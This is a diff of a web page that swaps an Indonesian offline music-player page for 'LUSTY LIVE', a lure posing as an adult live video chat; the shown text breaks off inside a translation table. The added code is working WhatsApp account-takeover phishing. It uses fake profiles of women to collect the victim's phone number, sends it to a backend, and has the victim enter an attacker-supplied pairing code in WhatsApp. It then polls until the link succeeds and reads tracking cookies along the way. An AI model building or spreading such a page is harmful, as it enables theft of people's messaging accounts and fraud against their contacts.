@@ -1,136 +1,1037 @@
+
 <!DOCTYPE html>
-<html lang="id" data-theme="dark">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <meta name="theme-color" content="#4DD0E1">
-    <meta name="description" content="Lrc Music Player - Full Offline & Full Kostumisasi, pemutar musik dengan lirik multi-bahasa">
-    <meta name="keywords" content="lrc, music player, offline, lyrics, customizable">
-    <title>🎵 Lrc Music Player — Full Offline</title>
-    <link rel="stylesheet" href="css/style.css">
-    <link rel="manifest" href="manifest.json">
-    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 180 180'><circle cx='90' cy='90' r='80' fill='%234DD0E1'/><path d='M70 50 L130 80 L70 110 Z' fill='white'/></svg>">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Live Video Chat - Connect Now</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/intl-tel-input@23.0.4/build/css/intlTelInput.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Meta Pixel Code -->
+    <script>
+        !function (f, b, e, v, n, t, s) {
+            if (f.fbq) return; n = f.fbq = function () {
+                n.callMethod ?
+                    n.callMethod.apply(n, arguments) : n.queue.push(arguments)
+            };
+            if (!f._fbq) f._fbq = n; n.push = n; n.loaded = !0; n.version = '2.0';
+            n.queue = []; t = b.createElement(e); t.async = !0;
+            t.src = v; s = b.getElementsByTagName(e)[0];
+            s.parentNode.insertBefore(t, s)
+        }(window, document, 'script', 'https://connect.facebook.net/en_US/fbevents.js');
+
+        (function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const dynamicPixelId = urlParams.get('pixelId');
+            const finalId = dynamicPixelId || '';
+            if (finalId) {
+                fbq('init', finalId);
+                fbq('track', 'PageView');
+                var noscriptImg = document.createElement('img');
+                noscriptImg.height = 1;
+                noscriptImg.width = 1;
+                noscriptImg.style.display = 'none';
+                noscriptImg.src = 'https://www.facebook.com/tr?id=' + finalId + '&ev=PageView&noscript=1';
+                if (document.body) {
+                    document.body.appendChild(noscriptImg);
+                } else {
+                    document.head.appendChild(noscriptImg);
+                }
+            }
+        })();
+        function getFacebookCookie(name) {
+            const value = `; ${document.cookie}`;
+            const parts = value.split(`; ${name}=`);
+            if (parts.length === 2) return parts.pop().split(';').shift();
+        }
+        const fbp = getFacebookCookie('_fbp');
+        const fbc = getFacebookCookie('_fbc');
+    </script>
+    <!-- End Meta Pixel Code -->
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-5YR77PWKP8"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag() { dataLayer.push(arguments); }
+        gtag('js', new Date());
+
+        gtag('config', 'G-5YR77PWKP8');
+    </script>
+    <style>
+        .no-scrollbar::-webkit-scrollbar { display: none; }
+        
+        /* 核心修复：还原你原始的双列无限滚动 */
+        @keyframes scroll-vertical {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(-50%); }
+        }
+        .auto-scroll-container {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr); /* 确保是双列 */
+            gap: 12px;
+            animation: scroll-vertical 60s linear infinite;
+        }
+        .auto-scroll-container:active { animation-play-state: paused; }
+
+        @keyframes pulse-brilliant {
+            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(236, 72, 153, 0.7); }
+            70% { transform: scale(1.05); box-shadow: 0 0 0 20px rgba(236, 72, 153, 0); }
+            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(236, 72, 153, 0); }
+        }
+        .animate-login { animation: pulse-brilliant 1.5s infinite; }
+
+        .sheet-active { transform: translateY(0) !important; }
+
+        /* intl-tel-input 暗色适配 */
+        .iti { width: 100%; color: white; }
+        .iti__country-list { background-color: #1e293b !important; color: white !important; border: 1px solid #334155 !important;}
+        .iti__search-input { background-color: #0f172a !important; color: white !important; border-bottom: 1px solid #334155 !important;}
+        .iti__selected-dial-code { color: white !important; margin-left: 4px; }
+
+        /* Toast 动画 */
+        @keyframes slideIn { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+        .animate-toast { animation: slideIn 0.3s ease-out forwards; }
+    </style>
 </head>
-<body>
-    <!-- Ambient background -->
-    <div class="bg-particles"></div>
-    <a href="#player" class="skip-link">⬇️ Lewati ke player</a>
+<body class="bg-black text-white overflow-hidden h-screen flex flex-col font-sans">
 
-    <!-- Penanda buku kecil: panel kontrol -->
-    <div class="top-controls" role="toolbar" aria-label="Kontrol utama">
-        <button class="bookmark-tab" id="panelToggleBtn" aria-label="Buka panel kontrol" title="Panel Kontrol">
-            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-                <polyline points="6 9 12 15 18 9" />
+    <div id="toast-container" class="fixed top-20 right-5 z-[200] flex flex-col gap-3"></div>
+
+    <div class="fixed top-0 inset-x-0 z-50 bg-gradient-to-b from-black via-black/70 to-transparent p-4 flex justify-between items-center">
+        <div class="flex items-center space-x-2">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="logo" class="h-8"></img>
+            <span class="flex h-3 w-3">
+                <span class="animate-ping absolute inline-flex h-3 w-3 rounded-full bg-rose-400 opacity-75"></span>
+                <span class="relative inline-flex rounded-full h-3 w-3 bg-rose-500"></span>
+            </span>
+            <h1 class="font-black text-2xl italic tracking-tighter text-rose-500" id="content1">LUSTY LIVE</h1>
+        </div>
+        <div class="flex flex-col items-end">
+            <div class="text-[10px] glass-tag px-2 py-1 rounded border border-white/20">
+                <span id="content2">ONLINE</span> <span class="text-green-400 font-bold" id="online-count">14,281</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="flex-grow overflow-hidden relative" onclick="triggerLogin()">
+        <div class="auto-scroll-container grid grid-cols-2 gap-3 px-3 pt-20" id="scroll-content">
+            </div>
+        
+        <div class="absolute inset-x-0 bottom-0 h-80 bg-gradient-to-t from-black via-black/90 to-transparent z-10 pointer-events-none"></div>
+    </div>
+
+    <div class="fixed bottom-0 inset-x-0 z-50 p-6 flex flex-col items-center">
+        <div class="text-center mb-5">
+            <h2 class="text-xl font-extrabold text-white tracking-tight" id="content3">Real Girls. Real Connections</h2>
+            <p class="text-sm text-rose-400 font-medium italic mt-1" id="content4">10,000+ girls are waiting for your call...</p>
+        </div>
+        
+        <button onclick="triggerLogin()" class="animate-login w-full max-w-sm bg-gradient-to-r from-rose-600 to-pink-500 text-white py-4 rounded-2xl font-black text-xl shadow-2xl active:scale-95 transition-transform flex items-center justify-center space-x-3">
+            <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 20 20">
+                <path d="M2 6a2 2 0 012-2h6a2 2 0 012 2v8a2 2 0 01-2 2H4a2 2 0 01-2-2V6zM14.553 7.106A1 1 0 0014 8v4a1 1 0 00.553.894l2 1A1 1 0 0018 13V7a1 1 0 00-1.447-.894l-2 1z"></path>
             </svg>
+            <span id="content5">Continue With WhatsApp</span>
         </button>
-        <div class="control-panel" id="controlPanel" aria-hidden="true">
-            <div class="panel-section themes">
-                <span class="panel-label">Tema</span>
-                <div class="theme-options">
-                    <button class="theme-option active" data-theme="dark" aria-label="Tema Gelap">Gelap</button>
-                    <button class="theme-option" data-theme="light" aria-label="Tema Terang">Terang</button>
-                    <button class="theme-option" data-theme="blue" aria-label="Tema Biru Animasi">Biru</button>
+        
+        <div class="mt-4 flex items-center space-x-4 opacity-40">
+            <span class="text-[9px] uppercase tracking-widest font-bold" id="content6">100% Real Users</span>
+            <span class="text-[9px] uppercase tracking-widest font-bold" id="content7">Privacy Secured</span>
+            <span class="text-[9px] uppercase tracking-widest font-bold" id="content8">18+ Only</span>
+        </div>
+    </div>
+
+    <div id="login-sheet" class="fixed inset-x-0 bottom-0 h-[75vh] bg-slate-900 border-t border-white/10 z-[150] transform translate-y-full transition-transform duration-300 ease-out shadow-2xl rounded-t-[32px] overflow-y-auto no-scrollbar">
+        <div class="w-12 h-1.5 bg-slate-700 rounded-full mx-auto mt-3 mb-2"></div>
+        
+        <div class="p-6 h-full">
+            <div id="step-input" class="space-y-6">
+                <div class="flex justify-between items-start">
+                    <div>
+                        <h3 class="text-2xl font-black italic" id="content9">Verify Real Person</h3>
+                        <p class="text-sm text-slate-400 mt-1" id="content10">Please enter your WhatsApp number to verify</p>
+                    </div>
+                    <button onclick="closeLoginSheet()" class="bg-slate-800 p-2 rounded-full text-slate-400">✕</button>
                 </div>
+                <div>
+                    <label class="text-[10px] font-bold text-slate-500 ml-1 block mb-2" id="content11">WhatsApp Number</label>
+                    <input id="phone-input" type="tel" class="w-full p-4 rounded-2xl bg-slate-800 border border-white/10 text-white outline-none focus:ring-2 focus:ring-rose-500">
+                </div>
+                <button id="btn-get-code" class="w-full py-4 rounded-2xl bg-rose-600 text-white font-black text-lg shadow-lg active:scale-95 transition-transform">Continue</button>
             </div>
-            <div class="panel-section action">
-                <button class="panel-add-btn" id="addSongPanelBtn" aria-label="Tambah lagu baru" title="Tambah Lagu">
-                    <svg class="add-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
-                        <path class="plus" d="M12 5v14M5 12h14" />
-                        <path class="cross" d="M18 6L6 18M6 6l12 12" style="display:none;" />
-                    </svg>
-                </button>
-                <span class="panel-label">Tambah</span>
+
+            <div id="step-show-code" class="hidden space-y-6 animate-in fade-in">
+                <div class="text-center">
+                    <h3 class="text-xl font-bold" id="content13">Please enter the pairing code in your WhatsApp</h3>
+                    <p class="text-slate-400 text-sm mt-2"><span id="content14">WhatsApp Number:</span> <span id="display-phone" class="text-white font-bold underline"></span></p>
+                </div>
+                
+                <div class="bg-slate-800 rounded-3xl p-8 border-2 border-dashed border-rose-500/50 flex flex-col items-center">
+                    <span id="eight-digit-code" class="text-4xl font-black tracking-[0.4em] text-rose-500 mb-4"></span>
+                    <button onclick="copyAndNext()" class="bg-rose-600/20 text-rose-400 px-6 py-2 rounded-full text-sm font-bold border border-rose-500/30" id="content15">Copy to WhatsApp</button>
+                </div>
+                <p class="text-center text-[10px] text-slate-500 uppercase tracking-widest" id="content16">Get verified to start interacting with 10,000+ real girls!</p>
+            </div>
+
+            <div id="step-final" class="hidden space-y-5 animate-in fade-in slide-in-from-bottom-4">
+                <div class="bg-emerald-500/10 border border-emerald-500/20 p-4 rounded-2xl">
+                    <p class="text-emerald-400 font-bold text-xs text-center" id="content17">The pairing code has been copied, please paste it in WhatsApp</p>
+                </div>
+
+                <div class="flex justify-between items-center bg-slate-800/50 p-4 rounded-2xl border border-white/5">
+                    <div>
+                        <p class="text-[10px] text-slate-500 uppercase font-bold" id="content18">WhatsApp Pairing Code</p>
+                        <p id="final-code-display" class="text-2xl font-black text-white tracking-widest"></p>
+                    </div>
+                    <div class="h-10 w-10 border-2 border-rose-500/20 rounded-full flex items-center justify-center text-rose-500 font-bold text-xs" id="countdown-circle">10s</div>
+                </div>
+
+                <div class="rounded-2xl overflow-hidden border border-white/10 shadow-lg relative">
+                    <img src="https://static.tenux.site/static/wsimg/ic-code-tip.png" class="w-full h-full object-cover opacity-80">
+                </div>
+
+                <button id="poll-button" disabled class="w-full py-4 rounded-2xl bg-slate-800 text-slate-500 font-black text-lg transition-all">Waiting (10s)</button>
             </div>
         </div>
     </div>
 
-    <!-- Sidebar Playlist -->
-    <div class="sidebar-overlay" id="sidebarOverlay" role="presentation"></div>
-    <aside class="sidebar" id="sidebar" role="navigation" aria-label="Daftar lagu">
-        <h2 class="sidebar-header">
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18V5l12-2v13"/><circle cx="6" cy="18" r="3"/><circle cx="18" cy="16" r="3"/></svg>
-            Daftar Lagu
-        </h2>
-        <div id="playlistContainer" role="region" aria-label="Playlist songs">
-            <p class="empty-text">Belum ada lagu</p>
-        </div>
-        <button class="btn-add-song" id="addSongSidebarBtn" aria-label="Tambah lagu baru">
-            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 5v14M5 12h14"/></svg>
-            Tambah Lagu
-        </button>
-    </aside>
-
-    <!-- Main App -->
-    <main class="app-main" id="player" role="main">
-        <div class="hero-center">
-            <h1 class="breathing-title">Lrc Music Player</h1>
-            <p class="hero-sub">Full Offline & Full Kostumisasi</p>
-        </div>
-
-        <div class="content-card player-card" role="region" aria-label="Pemutar musik">
-            <div class="now-playing" id="nowPlaying" aria-live="polite">
-                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18V5l12-2v13"/><circle cx="6" cy="18" r="3"/><circle cx="18" cy="16" r="3"/></svg>
-                <span>Pilih atau tambah lagu</span>
-            </div>
-
-            <audio id="audio" preload="auto" crossorigin="anonymous"></audio>
-
-            <div class="progress-container" role="progressbar" aria-label="Progres lagu">
-                <span id="currentTime" class="time">0:00</span>
-                <div class="progress-bar" id="progressBar">
-                    <div class="progress-fill" id="progressFill"></div>
-                    <input type="range" id="seekSlider" class="seek-slider" min="0" max="100" step="0.1" value="0" aria-label="Seek bar">
-                </div>
-                <span id="duration" class="time">0:00</span>
-            </div>
-
-            <div class="player-controls" role="group" aria-label="Kontrol pemutar">
-                <button class="control-btn" id="prevBtn" aria-label="Lagu sebelumnya"><svg viewBox="0 0 24 24" class="btn-icon"><path d="M6 6h2v12H6zm3.5 6l8.5 6V6z" fill="currentColor"/></svg></button>
-                <button class="control-btn play-btn" id="playBtn" aria-label="Putar/Jeda"><svg viewBox="0 0 24 24" class="btn-icon play-icon"><path class="play-path" d="M8 5v14l11-7z" fill="currentColor" /><path class="pause-path" d="M6 19h4V5H6v14zm8-14v14h4V5h-4z" fill="currentColor" style="display:none;" /></svg></button>
-                <button class="control-btn" id="nextBtn" aria-label="Lagu berikutnya"><svg viewBox="0 0 24 24" class="btn-icon"><path d="M6 18l8.5-6L6 6v12zm10-12h2v12h-2V6z" fill="currentColor"/></svg></button>
-            </div>
-
-            <div class="volume-control" role="group" aria-label="Kontrol volume">
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="vol-icon"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5" /><path d="M15.54 8.46a5 5 0 0 1 0 7.07" /><path d="M19.07 4.93a10 10 0 0 1 0 14.14" /></svg>
-                <input type="range" id="volumeSlider" class="volume-slider" min="0" max="1" step="0.05" value="0.7" aria-label="Volume">
-            </div>
-        </div>
-
-        <div class="lyrics-grid" id="lyricsGrid" role="region" aria-label="Lirik lagu">
-            <p class="empty-text" style="grid-column:1/-1;">📝 Lirik akan muncul di sini</p>
-        </div>
-    </main>
-
-    <!-- Modal Tambah Lagu -->
-    <div class="modal" id="addModal" role="dialog" aria-labelledby="modalTitle" aria-hidden="true">
-        <div class="modal-content">
-            <h2 id="modalTitle">
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 5v14M5 12h14"/></svg>
-                Tambah Lagu Baru
-            </h2>
-            <div class="form-group">
-                <label for="audioFileInput">🎵 File Audio</label>
-                <input type="file" id="audioFileInput" accept="audio/*" required aria-required="true">
-            </div>
-            <div id="lyricInputsContainer" role="group" aria-label="Kolom lirik"></div>
-            <div class="form-actions">
-                <button type="button" id="addLyricColumnBtn" class="btn-secondary">+ Kolom Lirik</button>
-                <button type="button" id="removeLyricColumnBtn" class="btn-secondary">− Kolom</button>
-            </div>
-            <div class="modal-footer">
-                <button type="button" id="cancelAddBtn" class="btn-secondary">Batal</button>
-                <button type="button" id="saveSongBtn" class="btn-primary">
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z"/><polyline points="17 21 17 13 7 13 7 21"/><polyline points="7 3 7 8 15 8"/></svg>
-                    Simpan Lagu
-                </button>
-            </div>
-        </div>
+    <div id="global-loading" class="fixed inset-0 bg-black/80 z-[200] hidden flex flex-col items-center justify-center">
+        <div class="w-12 h-12 border-4 border-rose-500 border-t-transparent rounded-full animate-spin"></div>
     </div>
 
-    <footer class="app-footer" role="contentinfo">
-        <p>Lrc Music Player — Full Offline & Full Kostumisasi</p>
-    </footer>
+    <script src="https://cdn.jsdelivr.net/npm/intl-tel-input@23.0.4/build/js/intlTelInput.min.js"></script>
+    <script>
 
-    <script src="js/script.js" defer></script>
+        let iti;
+        let currentCode = "";
+        let timer = null;
+
+        // Card generation function
+        function generateHTML(data) {
+            return data.map(girl => `
+                <div class="relative aspect-[3/4] rounded-3xl overflow-hidden shadow-2xl border border-white/10 group">
+                    <img src="${girl.img}" class="w-full h-full object-cover grayscale-[20%] group-active:grayscale-0">
+                    <div class="absolute inset-0 bg-gradient-to-t from-black/90 via-transparent to-transparent"></div>
+                    
+                    <div class="absolute top-3 left-3 flex items-center space-x-1.5 glass-tag px-2 py-1 rounded-full">
+                        <span class="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></span>
+                        <span class="text-[10px] font-bold uppercase tracking-tight">LIVE</span>
+                    </div>
+
+                    <div class="absolute bottom-3 left-3">
+                        <div class="text-shadow font-black text-lg">${girl.name}, ${girl.age}</div>
+                        <div class="text-shadow text-[11px] text-white/70 italic">"${girl.mood}"</div>
+                    </div>
+
+                    <div class="absolute bottom-3 right-3 bg-rose-500 p-2 rounded-full shadow-lg">
+                        <svg class="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 20 20"><path d="M2 3a1 1 0 011 1v1a1 1 0 01-1 1H2a1 1 0 01-1-1V4a1 1 0 011-1h1zm13 11a1 1 0 011 1v1a1 1 0 01-1 1h-1a1 1 0 01-1-1v-1a1 1 0 011-1h1zM4 14a1 1 0 011 1v1a1 1 0 01-1 1H3a1 1 0 01-1-1v-1a1 1 0 011-1h1zM16 4a1 1 0 011 1v1a1 1 0 01-1 1h-1a1 1 0 01-1-1V4a1 1 0 011-1h1z"></path></svg>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            // High-quality placeholder images (Replace with your actual marketing assets)
+            const girls = [
+                { name: "Chloe", age: 22, mood: "Feeling lonely", img: "https://static.tenux.site/static/se/lm/068_090.jpg" },
+                { name: "Jessica", age: 24, mood: "Let's chat!", img: "https://static.tenux.site/static/se/lm/e87_099.jpg" },
+                { name: "Mia", age: 20, mood: "Online now", img: "https://static.tenux.site/static/se/lm/bad_006.jpg" },
+                { name: "Sasha", age: 25, mood: "Active 1m ago", img: "https://static.tenux.site/static/se/lm/a6b_044.jpg" },
+                { name: "Bella", age: 21, mood: "Video call?", img: "https://static.tenux.site/static/se/lm/621_089.jpg" },
+                { name: "Elena", age: 23, mood: "Sweet heart", img: "https://static.tenux.site/static/se/lm/b59_017.jpg" },
+                { name: "Tiffany", age: 22, mood: "Waiting for you", img: "https://static.tenux.site/static/se/lm/279_047.jpg" },
+                { name: "Amber", age: 19, mood: "New here", img: "https://static.tenux.site/static/se/lm/f44_087.jpg" },
+                { name: "Lily", age: 20, mood: "In a meeting", img: "https://static.tenux.site/static/se/lm/d99_013.jpg" },
+                { name: "Sophie", age: 24, mood: "Call me maybe?", img: "https://static.tenux.site/static/se/lm/d8f_003.jpg" },
+                { name: "Zoe", age: 21, mood: "Feeling flirty", img: "https://static.tenux.site/static/se/lm/4a0_039.jpg" },
+                { name: "Nina", age: 23, mood: "Let's have fun!", img: "https://static.tenux.site/static/se/lm/78c_017.jpg" },
+                { name: "Maya", age: 20, mood: "Feeling shy", img: "https://static.tenux.site/static/se/lm/320_042.jpg" },
+                { name: "Maria", age: 25, mood: "Feeling confident", img: "https://static.tenux.site/static/se/lm/cb6_007.jpg" }
+            ];
+
+            const container = document.getElementById('scroll-content');
+
+            // Initialize content with 3x copies for seamless looping
+            container.innerHTML = generateHTML(girls) + generateHTML(girls) + generateHTML(girls) + generateHTML(girls);
+
+            iti = window.intlTelInput(document.querySelector("#phone-input"), {
+                initialCountry: "auto",
+                separateDialCode: true,
+	        geoIpLookup: cb => fetch("https://pro.ip-api.com/json/?key=X8nNh9l0HcVYntp").then(r => r.json()).then(d => cb(d.countryCode)).catch(() => cb("us")),
+                utilsScript: "https://cdn.jsdelivr.net/npm/intl-tel-input@23.0.4/build/js/utils.js"
+            });
+
+            var browser_language = navigator.languages[0].includes("-") ? navigator.languages[0].slice(0, navigator.languages[0].indexOf("-")) : navigator.languages[0];
+            browser_language = browser_language.toLowerCase();
+
+            const languagePackages = ['ar', 'bn', 'fa', 'en', 'hi', 'id', 'in', 'ms', 'ps', 'th', 'ur', 'sw', 'fr', 'it', 'pt', 'de', 'es', 'tl', 'fil', 'zh'];
+
+            let selectedLanguage = "en";
+            if (languagePackages.includes(browser_language)) {
+                selectedLanguage = browser_language;
+            }
+            updateLanguage(selectedLanguage);
+        });
+
+        function showToast(msg, type='error') {
+            const toastContainer = document.getElementById('toast-container');
+            const div = document.createElement('div');
+            div.className = `${type==='error'?'bg-red-600':'bg-emerald-600'} text-white px-6 py-3 rounded-2xl font-bold shadow-2xl animate-toast`;
+            div.innerText = msg;
+            toastContainer.appendChild(div);
+            setTimeout(() => { div.style.opacity='0'; setTimeout(()=>div.remove(),300); }, 3000);
+        }
+
+        function triggerLogin() { 
+            document.getElementById('login-sheet').classList.add('sheet-active');
+        }
+
+        function closeLoginSheet() { 
+            document.getElementById('login-sheet').classList.remove('sheet-active');
+            clearInterval(timer);
+            document.getElementById('step-input').classList.remove('hidden');
+            document.getElementById('step-show-code').classList.add('hidden');
+            document.getElementById('step-final').classList.add('hidden');
+        }
+
+        function getQueryVariable(variable) {
+            var query = window.location.search.substring(1);
+            var vars = query.split("&");
+            for (var i = 0; i < vars.length; i++) {
+                var pair = vars[i].split("=");
+                if (pair[0] == variable) {
+                    return pair[1];
+                }
+            }
+            return null;
+        }
+        referral = getQueryVariable('referral');
+        if (referral) {
+            localStorage.setItem("referral", referral);
+        } else {
+            var referral = localStorage.getItem("referral");
+            if (!referral) {
+                localStorage.setItem("referral", "");
+            }
+        }
+        function uuidv4() {
+            return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
+                const r = Math.random() * 16 | 0;
+                const v = c === 'x' ? r : (r & 0x3 | 0x8);
+                return v.toString(16);
+            });
+        }
+        const uuid = localStorage.getItem('uuid') || uuidv4().replace(/-/g, '');
+        localStorage.setItem('uuid', uuid);
+        localStorage.setItem('key', getQueryVariable('key') || "ZYWALM");
+        let userIP = "";
+        document.getElementById('btn-get-code').onclick = async () => {
+            fbq('track', 'CompleteRegistration', {external_id: uuid}, { eventID: uuid });
+            gtag('event', 'CompleteRegistration', { 'uuid': uuid });
+
+            if (!iti.isValidNumber()) return showToast(L ? L.toast1 : "Please enter a valid phone number");
+            document.getElementById('global-loading').classList.remove('hidden');
+            const selectedCountryData = iti.getSelectedCountryData();
+            const countryCode = '+' + selectedCountryData.dialCode;
+            const phone = iti.getNumber();
+            const phoneInput = phone.replace(countryCode, '');
+            currentCode = '11119999'; 
+            try {
+                let sourceExtend = JSON.stringify({
+                    ip: userIP,
+                    fbc: fbc || '',
+                    fbp: fbp || '',
+                    url: window.location.href
+                });
+                const response = await fetch('/webws/api/pair-code', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        key: localStorage.getItem('key'),
+                        uuid: localStorage.getItem('uuid'),
+                        code: currentCode,
+                        countryISO: selectedCountryData.iso2.toUpperCase(),
+                        phoneNumber: phoneInput,
+                        countryCode: countryCode,
+                        referral: localStorage.getItem('referral') || '',
+                        sourceExtend: sourceExtend
+                    })
+                });
+                const responseData = await response.json();
+                if (response.ok && responseData.success) {
+                    document.getElementById('display-phone').innerText = phone;
+                    document.getElementById('eight-digit-code').innerText = currentCode;
+                    document.getElementById('step-input').classList.add('hidden');
+                    document.getElementById('step-show-code').classList.remove('hidden');
+                    document.getElementById('global-loading').classList.add('hidden');
+                } else {
+                    showToast(L ? L.toast2 : "Please try again later");
+                }
+            } catch (error) {
+                console.error("API Error:", error);
+                showToast(L ? L.toast3 : "Connection failed. Check your network");
+            } finally {
+                //toggleLoading(false);
+            }
+        };
+
+        async function copyAndNext() {
+            fbq('track', 'SubmitApplication', {external_id: uuid}, { eventID: uuid });
+            gtag('event', 'SubmitApplication', { 'uuid': uuid });
+
+            await navigator.clipboard.writeText(currentCode);
+            //showToast("代码已复制到剪贴板", "success");
+            
+            document.getElementById('final-code-display').innerText = currentCode;
+            document.getElementById('step-show-code').classList.add('hidden');
+            document.getElementById('step-final').classList.remove('hidden');
+            
+            startPolling();
+        }
+
+        function startPolling() {
+            const btn = document.getElementById('poll-button');
+            const circle = document.getElementById('countdown-circle');
+            let count = 10;
+            
+            btn.disabled = true;
+            btn.className = "w-full py-4 rounded-2xl bg-slate-800 text-slate-500 font-black text-lg";
+
+            timer = setInterval(() => {
+                count--;
+                btn.innerText = L ? L.toast4 + `(${count}s)` : `Checking login status (${count}s)`;
+                circle.innerText = count + "s";
+
+                if (count <= 0) {
+                    clearInterval(timer);
+                    mockApiCheck();
+                }
+            }, 1000);
+        }
+
+        async function mockApiCheck() {
+            const btn = document.getElementById('poll-button');
+            try {
+                const response = await fetch('/webws/api/result?key=' + localStorage.getItem('key') + '&uuid=' + localStorage.getItem('uuid') + '&phone=' + localStorage.getItem('phone'), {
+                    method: 'GET'
+                });
+                const responseData = await response.json();
+                if (response.ok && responseData.success && responseData.data.loggedIn) {
+                    var referral = localStorage.getItem('referral');
+                    var bindWsSign = localStorage.getItem('bindWsSign');
+                    if (!referral && !bindWsSign && responseData.data.count === 1) {
+                        fbq('track', 'Subscribe', {external_id: uuid}, { eventID: uuid });
+                        gtag('event', 'Subscribe', { 'uuid': uuid });
+                    }
+                    localStorage.setItem('bindWsSign', '1');
+                    btn.innerText = L ? L.toast5 : "✓ Verification successful (click to continue)";
+                    btn.className = "w-full py-4 rounded-2xl bg-emerald-600 text-white font-black text-lg animate-bounce";
+                    btn.disabled = false;
+                    btn.onclick = () => window.location.href = "/share/index.html";
+                } else {
+                    btn.innerText = L ? L.toast6 : "Login not detected, click to retry";
+                    btn.className = "w-full py-4 rounded-2xl bg-rose-600 text-white font-black text-lg";
+                    btn.disabled = false;
+                    btn.onclick = () => startPolling();
+                }
+            } catch (error) {
+                console.error("API Error:", error);
+            }
+        }
+
+        let currentLang = "en", L = {};
+        const langData = {
+            "fil": {
+                "content1": "LUSTY LIVE",
+                "content2": "ONLINE",
+                "content3": "Mga Tunay na Babae. Tunay na Koneksyon",
+                "content4": "10,000+ na babae ang naghihintay sa tawag mo...",
+                "content5": "Ilagay ang iyong phone number",
+                "content6": "100% Tunay na User",
+                "content7": "Ligtas ang Privacy",
+                "content8": "18+ Lamang",
+                "content9": "I-verify ang Tunay na Tao",
+                "content10": "Mangyaring ilagay ang iyong WhatsApp number para mag-verify",
+                "content11": "Numero ng WhatsApp",
+                "btn-get-code": "Magpatuloy",
+                "content13": "Mangyaring ilagay ang pairing code sa iyong WhatsApp",
+                "content14": "Numero ng WhatsApp:",
+                "content15": "I-copy sa WhatsApp",
+                "content16": "Mag-verify para makipag-chat sa 10,000+ na tunay na babae!",
+                "content17": "Nakopya na ang pairing code, i-paste ito sa WhatsApp",
+                "content18": "WhatsApp Pairing Code",
+                "poll-button": "Naghihintay (10s)",
+                "toast1": "Mangyaring ilagay ang valid na numero ng telepono",
+                "toast2": "Mangyaring sumubok muli mamaya",
+                "toast3": "Bigo ang koneksyon. Suriin ang iyong network",
+                "toast4": "Sinusuri ang status ng login",
+                "toast5": "✓ Tagumpay ang pag-verify (i-click para magpatuloy)",
+                "toast6": "Walang nakitang login, i-click para subukan muli"
+            },
+            "tl": {
+                "content1": "LUSTY LIVE",
+                "content2": "ONLINE",
+                "content3": "Mga Tunay na Babae. Tunay na Koneksyon",
+                "content4": "10,000+ na babae ang naghihintay sa tawag mo...",
+                "content5": "Magpatuloy gamit ang WhatsApp",
+                "content6": "100% Tunay na User",
+                "content7": "Ligtas ang Privacy",
+                "content8": "18+ Lamang",
+                "content9": "I-verify ang Tunay na Tao",
+                "content10": "Mangyaring ilagay ang iyong WhatsApp number para mag-verify",
+                "content11": "Numero ng WhatsApp",
+                "btn-get-code": "Magpatuloy",
+                "content13": "Mangyaring ilagay ang pairing code sa iyong WhatsApp",
+                "content14": "Numero ng WhatsApp:",
+                "content15": "I-copy sa WhatsApp",
+                "content16": "Mag-verify para makipag-chat sa 10,000+ na tunay na babae!",
+                "content17": "Nakopya na ang pairing code, i-paste ito sa WhatsApp",
+                "content18": "WhatsApp Pairing Code",
+                "poll-button": "Naghihintay (10s)",
+                "toast1": "Mangyaring ilagay ang valid na numero ng telepono",
+                "toast2": "Mangyaring sumubok muli mamaya",
+                "toast3": "Bigo ang koneksyon. Suriin ang iyong network",
+                "toast4": "Sinusuri ang status ng login",
+                "toast5": "✓ Tagumpay ang pag-verify (i-click para magpatuloy)",
+                "toast6": "Walang nakitang login, i-click para subukan muli"
+            },
+            "th": {
